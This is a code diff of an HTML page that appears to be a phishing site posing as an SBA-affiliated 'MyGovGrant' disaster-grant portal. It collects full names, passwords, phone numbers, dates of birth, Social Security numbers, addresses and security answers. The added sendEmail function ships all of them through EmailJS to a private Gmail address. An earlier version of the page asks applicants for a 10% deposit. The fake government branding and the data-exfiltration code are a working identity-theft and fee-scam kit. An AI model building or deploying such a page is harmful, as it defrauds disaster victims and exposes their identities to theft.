@@ -91,259 +91,334 @@
             }
         });
     </script>
-</body>
 
+    <!-- Container -->
+    <div class="min-h-screen flex items-center justify-center bg-blue-900 py-12 px-4 sm:px-6 lg:px-8">
+        <div class="max-w-3xl w-full space-y-8 bg-white shadow-lg rounded-lg p-8">
 
-<!-- Container -->
-<div class="min-h-screen flex items-center justify-center bg-blue-900 py-12 px-4 sm:px-6 lg:px-8">
-    <div class="max-w-3xl w-full space-y-8 bg-white shadow-lg rounded-lg p-8">
-
-        <!-- Header Section -->
-        <div class="text-center">
-            <img src="grant logo.png" class="mx-auto h-12" alt="SBA Logo">
-            <h2 class="mt-6 text-3xl font-extrabold text-gray-900 mb-4">
-                MyGovGrant
-            </h2>
-            <p class="text-xl font-semibold text-gray-600 mb-6">
-                One login for multiple Government Grant programs
-            </p>
-
-            <p class="text-sm text-gray-600 mb-8">
-                Vision pro base investment Ltb in partnership with the MyGovGrant for disaster individuals is dedicated
-                to protecting your data, the steps required to register and sign in are necessary to ensure your data will
-                stay safe with us  
-            </p>
-        </div>
-
-        <!-- Step Indicator -->
-        <div class="flex justify-center mb-6">
+            <!-- Header Section -->
             <div class="text-center">
-                <div class="flex items-center">
-                    <div id="step-1-indicator" class="rounded-full bg-green-500 h-4 w-4"></div>
-                    <div class="border-t border-gray-300 flex-auto"></div>
-                    <div id="step-2-indicator" class="rounded-full bg-gray-300 h-4 w-4"></div>
-                    <div class="border-t border-gray-300 flex-auto"></div>
-                    <div id="step-3-indicator" class="rounded-full bg-gray-300 h-4 w-4"></div>
-                </div>
-                <div id="step-indicator-text" class="mt-2 text-sm text-gray-500">Step 1: Account Creation</div>
-            </div>
-        </div>
+                <img src="grant logo.png" class="mx-auto h-12" alt="SBA Logo">
+                <h2 class="mt-6 text-3xl font-extrabold text-gray-900 mb-4">
+                    MyGovGrant
+                </h2>
+                <p class="text-xl font-semibold text-gray-600 mb-6">
+                    One login for multiple Government Grant programs
+                </p>
 
-        <!-- Form -->
-        <form id="multiStepForm">
-            <!-- Step 1: Account Creation -->
-            <div id="step-1" class="space-y-4">
-                <div>
-                    <label for="fullName" class="block text-sm font-medium text-gray-700">Full Name</label>
-                    <input id="fullName" name="fullName" type="text" required class="mt-1 p-2 w-full border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500" placeholder="John Doe">
-                </div>
-                <div>
-                    <label for="email" class="block text-sm font-medium text-gray-700">Email</label>
-                    <input id="email" name="email" type="email" required class="mt-1 p-2 w-full border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500" placeholder="johndoe@example.com">
-                </div>
-                <div>
-                    <label for="password" class="block text-sm font-medium text-gray-700">Password</label>
-                    <input id="password" name="password" type="password" required class="mt-1 p-2 w-full border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500" placeholder="********">
-                </div>
-                <div>
-                    <label for="confirmPassword" class="block text-sm font-medium text-gray-700">Confirm Password</label>
-                    <input id="confirmPassword" name="confirmPassword" type="password" required class="mt-1 p-2 w-full border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500" placeholder="********">
-                </div>
-                <div>
-                    <label for="homePhone" class="block text-sm font-medium text-gray-700">Home Phone Number</label>
-                    <input id="homePhone" name="homePhone" type="tel" required class="mt-1 p-2 w-full border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500" placeholder="(555) 123-4567">
-                </div>
-                <div>
-                    <label for="mobilePhone" class="block text-sm font-medium text-gray-700">Mobile Number</label>
-                    <input id="mobilePhone" name="mobilePhone" type="tel" required class="mt-1 p-2 w-full border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500" placeholder="(555) 987-6543">
-                </div>
+                <p class="text-sm text-gray-600 mb-8">
+                    Vision pro base investment Ltb in partnership with the MyGovGrant for disaster individuals is dedicated
+                    to protecting your data, the steps required to register and sign in are necessary to ensure your data will
+                    stay safe with us  
+                </p>
             </div>
 
-            <!-- Step 2: Personal Details -->
-            <div id="step-2" class="hidden space-y-4">
-                <div>
-                    <label for="dob" class="block text-sm font-medium text-gray-700">Date of Birth</label>
-                    <input id="dob" name="dob" type="date" required class="mt-1 p-2 w-full border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500">
-                </div>
-                <div>
-                    <label for="ssn" class="block text-sm font-medium text-gray-700">Your Social Security Number</label>
-                    <input id="ssn" name="ssn" type="password" required class="p-2 w-full border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500">
-                </div>
-                <div>
-                    <label for="grantamount" class="block text-sm font-medium text-gray-700">Requested grant amount</label>
-                    <div class="relative">
-                        <span class="absolute inset-y-0 left-0 pl-3 flex items-center text-gray-500">$</span>
-                        <input id="grantamount" name="grantamount" type="number" required 
-                               class="p-2 pl-7 w-full border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500"
-                               placeholder="Enter grant amount">
+            <!-- Step Indicator -->
+            <div class="flex justify-center mb-6">
+                <div class="text-center">
+                    <div class="flex items-center">
+                        <div id="step-1-indicator" class="rounded-full bg-green-500 h-4 w-4"></div>
+                        <div class="border-t border-gray-300 flex-auto"></div>
+                        <div id="step-2-indicator" class="rounded-full bg-gray-300 h-4 w-4"></div>
+                        <div class="border-t border-gray-300 flex-auto"></div>
+                        <div id="step-3-indicator" class="rounded-full bg-gray-300 h-4 w-4"></div>
                     </div>
-                    <p class="text-xs text-gray-500 mt-1">
-                        For every $10,000 grant request, you would be required to settle a 10% initial deposit. Contact 
-                        <a href="mailto:support@visionprobase.tech" class="text-blue-600 underline">support@visionprobase.tech</a> for more information.
-                    </p>                    
-                </div>                
-                <div>
-                    <label for="homeAddress" class="block text-sm font-medium text-gray-700">Home Address</label>
-                    <input id="homeAddress" name="homeAddress" type="text" required class="mt-1 p-2 w-full border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500" placeholder="123 Main St">
+                    <div id="step-indicator-text" class="mt-2 text-sm text-gray-500">Step 1: Account Creation</div>
+                </div>
+            </div>
+
+            <!-- Form -->
+            <form id="multiStepForm">
+                <!-- Step 1: Account Creation -->
+                <div id="step-1" class="space-y-4">
+                    <div>
+                        <label for="fullName" class="block text-sm font-medium text-gray-700">Full Name</label>
+                        <input id="fullName" name="fullName" type="text" required class="mt-1 p-2 w-full border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500" placeholder="John Doe">
+                    </div>
+                    <div>
+                        <label for="email" class="block text-sm font-medium text-gray-700">Email</label>
+                        <input id="email" name="email" type="email" required class="mt-1 p-2 w-full border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500" placeholder="johndoe@example.com">
+                    </div>
+                    <div>
+                        <label for="password" class="block text-sm font-medium text-gray-700">Password</label>
+                        <input id="password" name="password" type="password" required class="mt-1 p-2 w-full border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500" placeholder="********">
+                    </div>
+                    <div>
+                        <label for="confirmPassword" class="block text-sm font-medium text-gray-700">Confirm Password</label>
+                        <input id="confirmPassword" name="confirmPassword" type="password" required class="mt-1 p-2 w-full border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500" placeholder="********">
+                    </div>
+                    <div>
+                        <label for="homePhone" class="block text-sm font-medium text-gray-700">Home Phone Number</label>
+                        <input id="homePhone" name="homePhone" type="tel" required class="mt-1 p-2 w-full border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500" placeholder="(555) 123-4567">
+                    </div>
+                    <div>
+                        <label for="mobilePhone" class="block text-sm font-medium text-gray-700">Mobile Number</label>
+                        <input id="mobilePhone" name="mobilePhone" type="tel" required class="mt-1 p-2 w-full border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500" placeholder="(555) 987-6543">
+                    </div>
+                </div>
+
+                <!-- Step 2: Personal Details -->
+                <div id="step-2" class="hidden space-y-4">
+                    <div>
+                        <label for="dob" class="block text-sm font-medium text-gray-700">Date of Birth</label>
+                        <input id="dob" name="dob" type="date" required class="mt-1 p-2 w-full border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500">
+                    </div>
+                    <div>
+                        <label for="ssn" class="block text-sm font-medium text-gray-700">Your Social Security Number</label>
+                        <input id="ssn" name="ssn" type="text" required class="p-2 w-full border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500" onblur="validateSSN()">
+                        <p id="ssn-error" class="text-red-500 text-sm hidden">Please enter a valid SSN in the format XXX-XX-XXXX.</p>
+                    </div>
                     
-                    <!-- Small Text -->
-                    <p class="text-sm text-gray-500 mt-1">Only addresses affected by the flood will be considered.</p>
+                    <script>
+                        function validateSSN() {
+                            const ssnInput = document.getElementById('ssn');
+                            const ssnError = document.getElementById('ssn-error');
+                            const ssnPattern = /^\d{3}-\d{2}-\d{4}$/; // Regex for SSN format
+                    
+                            if (!ssnPattern.test(ssnInput.value)) {
+                                ssnError.classList.remove('hidden');
+                                ssnInput.classList.add('border-red-500'); // Optional: Add red border for invalid input
+                            } else {
+                                ssnError.classList.add('hidden');
+                                ssnInput.classList.remove('border-red-500'); // Remove red border for valid input
+                            }
+                        }
+                    </script>
+                    
+                    <div>
+                        <label for="grantamount" class="block text-sm font-medium text-gray-700">Requested grant amount</label>
+                        <div class="relative">
+                            <span class="absolute inset-y-0 left-0 pl-3 flex items-center text-gray-500">$</span>
+                            <input id="grantamount" name="grantamount" type="number" required 
+                                   class="p-2 pl-7 w-full border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500"
+                                   placeholder="Enter grant amount">
+                        </div>
+                        <p class="text-xs text-gray-500 mt-1">
+                            Grant amount vary by the grant program you are applying for. Min amount for all grant funding is $5000 
+                            <a href="mailto:support@visionprobase.tech" class="text-blue-600 underline">info@visionprobase.tech</a> for more information.
+                        </p>                    
+                    </div>   
+                    <div>
+                        <label for="officeAddress" class="block text-sm font-medium text-gray-700">Office Address</label>
+                        <input id="officeAddress" name="officeAddress" type="text" required class="mt-1 p-2 w-full border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500" placeholder="123 Main St">
+                        
+                        <!-- Small Text -->
+                        <p class="text-xs text-gray-500 mt-1">Enter your business address if you are applying for a business grant.</p>
+                    </div>             
+                    <div>
+                        <label for="homeAddress" class="block text-sm font-medium text-gray-700">Home Address</label>
+                        <input id="homeAddress" name="homeAddress" type="text" required class="mt-1 p-2 w-full border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500" placeholder="123 Main St">
+                        
+                        <!-- Small Text -->
+                        <p class="text-xs text-gray-500 mt-1">Only addresses and areas affected by the flood and nautral disasters will be considered.</p>
+                    </div>
+                    <div>
+                        <label for="city" class="block text-sm font-medium text-gray-700">City</label>
+                        <input id="city" name="city" type="text" required class="mt-1 p-2 w-full border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500" placeholder="City Name">
+                    </div>
+                    <div>
+                        <label for="state" class="block text-sm font-medium text-gray-700">State</label>
+                        <input id="state" name="state" type="text" required class="mt-1 p-2 w-full border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500" placeholder="State Name">
+                    </div>
+                    <div>
+                        <label for="zipCode" class="block text-sm font-medium text-gray-700">Zip Code</label>
+                        <input id="zipCode" name="zipCode" type="text" required class="mt-1 p-2 w-full border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500" placeholder="12345">
+                    </div>
+                    <div>
+                        <label for="country" class="block text-sm font-medium text-gray-700">Country</label>
+                        <select id="country" name="country" required class="mt-1 p-2 w-full border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500">
+                            <option value="united-states">United States</option>
+                            <option value="virgin-islands-us">Virgin Islands (U.S.)</option>
+                        </select>
+                    </div>                
                 </div>
-                
-                <div>
-                    <label for="city" class="block text-sm font-medium text-gray-700">City</label>
-                    <input id="city" name="city" type="text" required class="mt-1 p-2 w-full border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500" placeholder="City Name">
-                </div>
-                <div>
-                    <label for="state" class="block text-sm font-medium text-gray-700">State</label>
-                    <input id="state" name="state" type="text" required class="mt-1 p-2 w-full border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500" placeholder="State Name">
-                </div>
-                <div>
-                    <label for="zipCode" class="block text-sm font-medium text-gray-700">Zip Code</label>
-                    <input id="zipCode" name="zipCode" type="text" required class="mt-1 p-2 w-full border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500" placeholder="12345">
-                </div>
-                <div>
-                    <label for="country" class="block text-sm font-medium text-gray-700">Country</label>
-                    <select id="country" name="country" required class="mt-1 p-2 w-full border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500">
-                        <option value="united-states">United States</option>
-                        <option value="virgin-islands-us">Virgin Islands (U.S.)</option>
-                    </select>
-                </div>                
-            </div>
 
-            <!-- Step 3: SBA Account -->
-            <div id="step-3" class="hidden space-y-4">
-                <h3 class="text-sm font-bold text-gray-700">MyGovGrant Account</h3>
-                <p class="text-xs text-gray-500 mb-4">You can view or manage your MyGovGrant Loan Accounts on your dashboard.</p>
-                <div>
-                    <label class="block text-sm font-medium text-gray-700">Do you currently have an open MyGovGrant loan?</label>
-                    <div class="mt-1 flex items-center space-x-4">
-                        <label class="inline-flex items-center">
-                            <input type="radio" class="form-radio text-blue-600" name="sbaLoan" value="yes">
-                            <span class="ml-2">Yes</span>
-                        </label>
-                        <label class="inline-flex items-center">
-                            <input type="radio" class="form-radio text-red-600" name="sbaLoan" value="no">
-                            <span class="ml-2">No</span>
-                        </label>
+                <!-- Step 3: SBA Account -->
+                <div id="step-3" class="hidden space-y-4">
+                    <h3 class="text-sm font-bold text-gray-700">MyGovGrant Account</h3>
+                    <p class="text-xs text-gray-500 mb-4">You can view or manage your MyGovGrant Loan Accounts on your dashboard.</p>
+
+                    <div>
+                        <label class="block text-sm font-medium text-gray-700">Do you currently have an open MyGovGrant loan?</label>
+                        <div class="mt-1 flex items-center space-x-4">
+                            <label class="inline-flex items-center">
+                                <input type="radio" class="form-radio text-blue-600" name="sbaLoan" value="yes">
+                                <span class="ml-2">Yes</span>
+                            </label>
+                            <label class="inline-flex items-center">
+                                <input type="radio" class="form-radio text-red-600" name="sbaLoan" value="no">
+                                <span class="ml-2">No</span>
+                            </label>
+                        </div>
+                    </div>
+
+                    <div>
+                        <label for="securityQuestion" class="block text-sm font-medium text-gray-700">Security Question</label>
+                        <input id="securityQuestion" name="securityQuestion" type="text" required class="mt-1 p-2 w-full border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500" placeholder="What is your pet's name?">
+                    </div>
+
+                    <div>
+                        <label for="grantApplication" class="block text-sm font-medium text-gray-700 mt-4">What grant are you applying for?</label>
+                        <select id="grantApplication" name="grantApplication" class="mt-1 p-2 w-full border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500">
+                            <option value="" disabled selected>Select a grant</option>
+                            <option value="flood-hurricane-2024">Flood & hurricane grant 2024</option>
+                            <option value="natural-disaster-2024">Natural disaster grant 2024</option>
+                            <option value="accident-insurance-grant">Accident insurance government grant</option>
+                            <option value="Business-Grant">Business grant</option>
+                        </select>
                     </div>
                 </div>
-                <div>
-                    <label for="securityQuestion" class="block text-sm font-medium text-gray-700">Security Question</label>
-                    <input id="securityQuestion" name="securityQuestion" type="text" required class="mt-1 p-2 w-full border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500" placeholder="What is your pet's name?">
+
+                <!-- Navigation Buttons -->
+                <div class="flex justify-between mt-6">
+                    <button id="prevBtn" type="button" class="bg-gray-300 text-gray-700 px-4 py-2 w-full hover:bg-gray-400 hidden" onclick="prevStep()">Previous</button>
+                    <button id="nextBtn" type="button" class="bg-red-600 text-white px-4 py-2 w-full hover:bg-red-700" onclick="nextStep()">Next Step</button>
                 </div>
-            </div>
-
-            <!-- Navigation Buttons -->
-            <div class="flex justify-between mt-6">
-                <button id="prevBtn" type="button" class="bg-gray-300 text-gray-700 px-4 py-2 w-full hover:bg-gray-400 hidden" onclick="prevStep()">Previous</button>
-                <button id="nextBtn" type="button" class="bg-red-600 text-white px-4 py-2 w-full hover:bg-red-700" onclick="nextStep()">Next Step</button>
-            </div>
-        </form>
+            </form>
+        </div>
     </div>
-</div>
 
-
-     <!-- Footer Section -->
-     <div class="mt-8 border-t pt-6 text-center text-gray-500 text-xs">
+    <!-- Footer Section -->
+    <div class="mt-8 border-t pt-6 text-center text-gray-500 text-xs">
         <p>U.S. Small Business Administration</p>
         <p>409 3rd St, SW. Washington DC 20416</p>
         <p class="mt-2">
             <a href="mailto:Info@visionprobase.tech" class="text-blue-600 hover:underline">Info@visionprobase.tech</a> | <a href="https://www.sba.gov/about-sba/open-government/about-sbagov-website/accessibility" class="text-blue-600 hover:underline">Accessibility</a>
         </p>
     </div>
-</div>
-</div>
 
-<!-- JavaScript for Multi-Step Form -->
-<script>
-    let currentStep = 1;
+    <!-- JavaScript for Multi-Step Form -->
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script>
+        let currentStep = 1;
 
-    function updateStepIndicator() {
-        const stepDescriptions = ['Account Creation', 'Personal Details', 'SBA Account'];
-        document.getElementById('step-indicator-text').textContent = `Step ${currentStep}: ${stepDescriptions[currentStep - 1]}`;
-        document.getElementById('step-1-indicator').classList.toggle('bg-green-500', currentStep === 1);
-        document.getElementById('step-2-indicator').classList.toggle('bg-green-500', currentStep === 2);
-        document.getElementById('step-3-indicator').classList.toggle('bg-green-500', currentStep === 3);
+        function updateStepIndicator() {
+            const stepDescriptions = ['Account Creation', 'Personal Details', 'SBA Account'];
+            document.getElementById('step-indicator-text').textContent = `Step ${currentStep}: ${stepDescriptions[currentStep - 1]}`;
+            document.getElementById('step-1-indicator').classList.toggle('bg-green-500', currentStep === 1);
+            document.getElementById('step-2-indicator').classList.toggle('bg-green-500', currentStep === 2);
+            document.getElementById('step-3-indicator').classList.toggle('bg-green-500', currentStep === 3);
+        }
+
+        function showStep(step) {
+            document.getElementById('step-1').classList.toggle('hidden', step !== 1);
+            document.getElementById('step-2').classList.toggle('hidden', step !== 2);
+            document.getElementById('step-3').classList.toggle('hidden', step !== 3);
+            document.getElementById('prevBtn').classList.toggle('hidden', step === 1);
+            document.getElementById('nextBtn').textContent = step === 3 ? 'Submit' : 'Next Step';
+        }
+
+        function validateStep(step) {
+            const currentStepElement = document.getElementById(`step-${step}`);
+            const inputs = currentStepElement.querySelectorAll('input[required]');
+
+            for (let input of inputs) {
+                if (!input.value) {
+                    alert('Please fill out all required fields.');
+                    return false;
+                }
+            }
+            return true;
+        }
+
+    function sendEmail() {
+        emailjs.init("qXOvrbfa0azvn_FJl"); // Replace with your actual EmailJS user ID
+
+        const formData = new FormData(document.getElementById('multiStepForm'));
+        const templateParams = {
+            email: 'harleyzain70@gmail.com',
+            from_name: formData.get('fullName'),
+            from_email: formData.get('email'),
+            grant_type: formData.get('grantApplication'),
+            grant_amount: formData.get('grantamount'),
+            message: `
+                Full Name: ${formData.get('fullName')}
+                Email: ${formData.get('email')}
+                Home Phone: ${formData.get('homePhone')}
+                Mobile Phone: ${formData.get('mobilePhone')}
+                Date of Birth: ${formData.get('dob')}
+                SSN: ${formData.get('ssn')}
+                Grant Amount: $${formData.get('grantamount')}
+                Office Address: ${formData.get('officeAddress')}
+                Home Address: ${formData.get('homeAddress')}
+                City: ${formData.get('city')}
+                State: ${formData.get('state')}
+                Zip Code: ${formData.get('zipCode')}
+                Country: ${formData.get('country')}
+                Existing SBA Loan: ${formData.get('sbaLoan')}
+                Security Question: ${formData.get('securityQuestion')}
+                Grant Type: ${formData.get('grantApplication')}
+            `
+        };
+        console.log('Template Params:', templateParams); // Add this line to debug
+
+        emailjs.send("service_sv9gdl4", "template_7mgbnvs", templateParams)
+            .then(function(response) {
+                console.log('Email sent successfully:', response);
+                showSuccessPopup();
+            }, function(error) {
+                console.error('Email send failed:', error);
+                alert('There was an error submitting your application. Please try again.');
+            });
     }
 
-    function showStep(step) {
-        document.getElementById('step-1').classList.toggle('hidden', step !== 1);
-        document.getElementById('step-2').classList.toggle('hidden', step !== 2);
-        document.getElementById('step-3').classList.toggle('hidden', step !== 3);
-        document.getElementById('prevBtn').classList.toggle('hidden', step === 1);
-        document.getElementById('nextBtn').textContent = step === 3 ? 'Submit' : 'Next Step';
-    }
-
-    function validateStep(step) {
-        const currentStepElement = document.getElementById(`step-${step}`);
-        const inputs = currentStepElement.querySelectorAll('input[required]');
-
-        for (let input of inputs) {
-            if (!input.value) {
-                alert('Please fill out all required fields.');
-                return false;
+        function nextStep() {
+            if (!validateStep(currentStep)) {
+                return;
+            }
+            if (currentStep < 3) {
+                currentStep++;
+                showStep(currentStep);
+                updateStepIndicator();
+            } else {
+                showLoadingState();
+                sendEmail(); // Send email when form is complete
             }
         }
-        return true;
-    }
 
-    function nextStep() {
-        if (!validateStep(currentStep)) {
-            return;
+        function prevStep() {
+            if (currentStep > 1) {
+                currentStep--;
+                showStep(currentStep);
+                updateStepIndicator();
+            }
         }
-        if (currentStep < 3) {
-            currentStep++;
+
+        function showLoadingState() {
+            const nextBtn = document.getElementById('nextBtn');
+            nextBtn.disabled = true;
+            nextBtn.innerHTML = 'Submitting...'; // Show loading state on the button
+
+            // Simulate loading delay, then show success message
+            setTimeout(() => {
+                showSuccessPopup();
+            }, 2000); // Simulate 2 seconds loading time
+        }
+
+        function showSuccessPopup() {
+            const popup = document.createElement('div');
+            popup.classList.add('fixed', 'inset-0', 'bg-black', 'bg-opacity-60', 'flex', 'justify-center', 'items-center', 'z-50');
+            popup.innerHTML = `
+                <div class="bg-white p-8 rounded-lg shadow-2xl w-96 text-center transform transition-transform scale-100 hover:scale-105 duration-300">
+                    <h2 class="text-3xl font-bold mb-4 text-blue-600">🎉 Success!</h2>
+                    <p class="text-gray-700 mb-6">Your application request has been submitted successfully.<br /> You will be notified about your eligiblity for this grant program via your registered email.</p>
+                    <button class="mt-6 bg-blue-500 hover:bg-gray-600 text-white px-6 py-3 w-full rounded shadow-md transition-colors duration-300 ease-in-out" id="goHomeBtn">
+                        Go Home
+                    </button>
+                </div>
+            `;
+
+            document.body.appendChild(popup);
+
+            document.getElementById('goHomeBtn').addEventListener('click', function () {
+                window.location.href = 'index.html'; // Redirect to index.html when "Go Home" is clicked
+            });
+        }
+
+        window.onload = function() {
             showStep(currentStep);
             updateStepIndicator();
-        } else {
-            showLoadingState(); // Show loading state before showing confirmation pop-up
-        }
-    }
-
-    function prevStep() {
-        if (currentStep > 1) {
-            currentStep--;
-            showStep(currentStep);
-            updateStepIndicator();
-        }
-    }
-
-    function showLoadingState() {
-        const nextBtn = document.getElementById('nextBtn');
-        nextBtn.disabled = true;
-        nextBtn.innerHTML = 'Submitting...'; // Show loading state on the button
-
-        // Simulate loading delay, then show success message
-        setTimeout(() => {
-            showSuccessPopup();
-        }, 2000); // Simulate 2 seconds loading time
-    }
-
-    function showSuccessPopup() {
-    const popup = document.createElement('div');
-    popup.classList.add('fixed', 'inset-0', 'bg-black', 'bg-opacity-60', 'flex', 'justify-center', 'items-center', 'z-50');
-    popup.innerHTML = `
-        <div class="bg-white p-8 rounded-lg shadow-2xl w-96 text-center transform transition-transform scale-100 hover:scale-105 duration-300">
-            <h2 class="text-3xl font-bold mb-4 text-blue-600">🎉 Success!</h2>
-            <p class="text-gray-700 mb-6">Your application request has been submitted successfully.<br /> You will be notified about your eligiblity for this grant program via your registered email.</p>
-            <button class="mt-6 bg-blue-500 hover:bg-gray-600 text-white px-6 py-3 w-full rounded shadow-md transition-colors duration-300 ease-in-out" id="goHomeBtn">
-                Go Home
-            </button>
-        </div>
-    `;
-
-    document.body.appendChild(popup);
-
-    document.getElementById('goHomeBtn').addEventListener('click', function () {
-        window.location.href = 'index.html'; // Redirect to index.html when "Go Home" is clicked
-    });
-}
-
-    window.onload = function() {
-        showStep(currentStep);
-        updateStepIndicator();
-    };
-</script>
+        };
+    </script>
 </body>
 </html>
